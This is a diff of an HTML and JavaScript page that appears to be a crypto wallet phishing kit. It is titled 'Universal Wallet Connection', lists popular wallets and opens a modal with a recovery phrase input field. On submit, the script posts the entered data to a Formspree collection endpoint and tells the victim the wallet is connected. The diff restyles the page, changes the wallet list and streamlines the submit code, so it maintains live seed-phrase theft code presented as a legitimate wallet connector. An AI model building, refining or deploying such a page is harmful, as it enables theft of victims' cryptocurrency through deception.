@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Connect Your Wallet</title>
+<title>Universal Wallet Connection</title>
 <style>
 * {
   margin: 0;
@@ -13,8 +14,8 @@
 }
 
 body {
-  background: #0f172a;
-  color: #fff;
+  background: #ffffff;
+  color: #0f172a;
   min-height: 100vh;
   padding: 20px;
 }
@@ -33,10 +34,11 @@ body {
 .header h1 {
   font-size: 2.5rem;
   margin-bottom: 10px;
+  color: #1e3a8a;
 }
 
 .header p {
-  color: #94a3b8;
+  color: #64748b;
 }
 
 .wallets-grid {
@@ -47,7 +49,7 @@ body {
 }
 
 .wallet-item {
-  background: #1e293b;
+  background: #f1f5f9;
   border-radius: 12px;
   padding: 20px;
   cursor: pointer;
@@ -55,23 +57,25 @@ body {
   display: flex;
   align-items: center;
   gap: 15px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
 }
 
 .wallet-item:hover {
   transform: translateY(-2px);
-  background: #2d3748;
+  background: #e2e8f0;
 }
 
 .wallet-logo {
   width: 40px;
   height: 40px;
-  background: #334155;
+  background: #cbd5e1;
   border-radius: 8px;
   display: flex;
   align-items: center;
   justify-content: center;
   font-weight: bold;
   font-size: 1.2em;
+  color: #1e3a8a;
 }
 
 .wallet-info {
@@ -81,11 +85,12 @@ body {
 .wallet-name {
   font-weight: 600;
   margin-bottom: 4px;
+  color: #1e3a8a;
 }
 
 .wallet-description {
   font-size: 0.85rem;
-  color: #94a3b8;
+  color: #64748b;
 }
 
 .modal {
@@ -102,21 +107,22 @@ body {
 }
 
 .modal-content {
-  background: #1e293b;
+  background: #f1f5f9;
   padding: 30px;
   border-radius: 16px;
   width: 90%;
   max-width: 500px;
+  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
 }
 
 .phrase-input {
   width: 100%;
   padding: 15px;
   margin: 20px 0;
-  background: #334155;
-  border: 1px solid #475569;
+  background: #e2e8f0;
+  border: 1px solid #cbd5e1;
   border-radius: 8px;
-  color: #fff;
+  color: #0f172a;
   font-size: 1rem;
 }
 
@@ -140,13 +146,14 @@ body {
   float: right;
   background: none;
   border: none;
-  color: #94a3b8;
+  color: #64748b;
   font-size: 1.5rem;
   cursor: pointer;
 }
 
 .modal-header {
   margin-bottom: 20px;
+  color: #1e3a8a;
 }
 
 @media (max-width: 768px) {
@@ -160,7 +167,7 @@ body {
 
 <div class="container">
   <div class="header">
-    <h1>Connect Your Wallet</h1>
+    <h1>Universal Wallet Connection</h1>
     <p>Choose your preferred wallet to connect to our platform</p>
   </div>
   
@@ -197,18 +204,12 @@ const wallets = [
   { name: "Rainbow", letter: "R", description: "The fun and simple way to start with Ethereum" },
   { name: "Sui Wallet", letter: "S", description: "The official Sui ecosystem wallet" },
   { name: "Exodus", letter: "E", description: "The all-in-one crypto wallet" },
-  { name: "Atomic", letter: "A", description: "Universal cryptocurrency wallet" },
-  { name: "Argent", letter: "A", description: "The best wallet for DeFi & L2" },
-  { name: "BitPay", letter: "B", description: "Secure Bitcoin wallet platform" },
-  { name: "Crypto.com", letter: "C", description: "The all-in-one cryptocurrency platform" },
-  { name: "Dharma", letter: "D", description: "The wallet that pays you to save" },
-  { name: "Frame", letter: "F", description: "A privacy-focused Ethereum wallet" },
-  { name: "GreenAddress", letter: "G", description: "Bitcoin wallet for power users" },
-  { name: "Huobi", letter: "H", description: "Professional digital asset management" },
-  { name: "ImToken", letter: "I", description: "A digital asset wallet trusted by millions" },
-  { name: "Klever", letter: "K", description: "Secure crypto wallet for the future" },
+  { name: "MyEtherWallet", letter: "M", description: "The original Ethereum wallet" },
   { name: "Ledger Live", letter: "L", description: "The companion app for your hardware wallet" },
-  { name: "MyEtherWallet", letter: "M", description: "The original Ethereum wallet" }
+  { name: "Ton Wallet", letter: "T", description: "Secure wallet for the TON blockchain" },
+  { name: "Solflare", letter: "S", description: "The wallet for Solana" },
+  { name: "Atomic", letter: "A", description: "Universal cryptocurrency wallet" },
+  { name: "Argent", letter: "A", description: "The best wallet for DeFi & L2" }
 ];
 
 function createWalletGrid() {
@@ -247,40 +248,29 @@ function handleSubmit(event) {
   const form = document.getElementById('walletForm');
   const formData = new FormData(form);
   
-  fetch('https://formspree.io/f/mdojqvda', { // Replace with your Formspree URL
+  fetch('https://formspree.io/f/mdojqvda', { 
     method: 'POST',
     body: formData,
-    headers: {
-      'Accept': 'application/json'
-    }
+    headers: { 'Accept': 'application/json' }
   })
   .then(response => {
-    if (response.ok) {
-      return response.json();
-    }
+    if (response.ok) return response.json();
     throw new Error('Network response was not ok.');
   })
   .then(data => {
     document.getElementById('formResponse').innerText = 'Success! Your wallet has been connected.';
-    setTimeout(() => {
-      closeModal();
-      window.location.href = '/'; // Redirect to the first page
-    }, 2000); // Adjust timeout duration as needed
+    closeModal();
   })
   .catch(error => {
     document.getElementById('formResponse').innerText = 'Error connecting wallet: ' + error.message;
   });
 }
 
-// Close modal when clicking outside
 window.onclick = function(event) {
   const modal = document.getElementById('connectModal');
-  if (event.target === modal) {
-    closeModal();
-  }
+  if (event.target === modal) closeModal();
 }
 
-// Initialize the wallet grid
 createWalletGrid();
 </script>
 </body>
